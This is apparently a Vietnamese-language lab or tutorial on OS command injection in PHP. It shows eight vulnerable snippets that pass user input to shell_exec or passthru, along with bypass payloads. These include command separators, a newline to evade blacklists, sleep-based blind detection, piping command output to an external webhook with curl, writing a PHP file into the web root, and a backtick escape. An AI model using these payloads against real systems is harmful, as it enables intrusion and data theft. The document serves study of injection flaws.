### Example 1

```
$command = $_POST['command'];
$target = $_POST['target'];
switch($command) {
  case "ping":
    $result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
...
```

Giá trị nhập vào không hề được validate mà được đưa trực tiếp vào hàm shell_exec() để thực thi. Khai thác:

`8.8.8.8 ; ls -la`

Sử dụng `;` để kết thúc câu OS command đầu tiên, và đưa câu OS command muốn thực thi vào.

### Example 2

```
$command = $_POST['command'];
$target = $_POST['target'];
if (strpos($target, ";") !== false) 
    die("detected!");
switch($command) {
  case "ping":
    $result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
```

Lần này chương trình filter dấu `;`, ngăn chặn việc chèn câu lệnh không mong muốn.

Ta có toán tử `&&` sẽ có cùng chức năng với `;`. Cách khai thác: `8.8.8.8 && ls`.

### Example 3

```
$command = $_POST['command'];
$target = $_POST['target'];
if (strpos($target, ";") !== false) 
    die("detected!");
if (strpos($target, "&") !== false) 
    die("detected!");
if (strpos($target, "|") !== false) 
    die("detected!");
```

Nâng cao hơn danh sách blacklish lần này bao gồm `; & | `. Có thể dùng kí tự xuống dòng trong linux để kết thúc câu OS command thứ nhất, URL encode của ký tự xuống dòng là %0A.

Cách khai thác: `8.8.8.8 %0A ls`.

### Example 4

```
$target = $_POST['target'];
switch($command) {
  case "backup":
    $result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
    if ($result !== null && strpos($result, "zip error") === false)
        die("Backup thành công");
    else
        die("Backup không thành công");
```

Ở ví dụ này, result không được in ra mà thay vào đó chỉ in ra thông báo backup thành cồn hay không thôi, vậy để biết liệu chương trình có thực thi OS command không thì gán $target = `; sleep 5;`.

Gửi response của câu OS command ra bên ngoài. Dùng tính năng data-binary của curl để bắn đi kết quả của một câu OS command qua webhook.

Payload: `; ls | curl <webhook> --data-binary @-;`.

### Example 5

Tương tự ex trước đó nhưng lần này chương trình được cấu hình không thể truy cập internet, vì vậy không thể gửi respond ra internet được.

Cách khai thác: `; echo '<?php phpinfo(); ?>' > /var/www/html/test.php ;`

### Example 6, 7

Có thể thao túng giá trị trả về bởi câu lệnh if. payload `q /etc/passwd;if [ "$(cat /* | cut -c 1)" = "C" ]; then sleep 5; fi #`

### Example 8

```
$input = addslashes($input);
$username = $input;

$cowsay = <<<EOF
echo 'Hello $username' | cowsay -f eyes -n
EOF;

passthru($cowsay);

```

Biến $username được chèn dấu backlash trước khi thực hiện các câu lệnh tiếp theo. 

Khai thác: `'; ls #`. 

Trường hợp: `echo 'Hello $username' | cowsay -n ; figlet "Hello $username"`

Khai thác dựa trên dấu "", chương trình không filter dấu backtick --> ``.







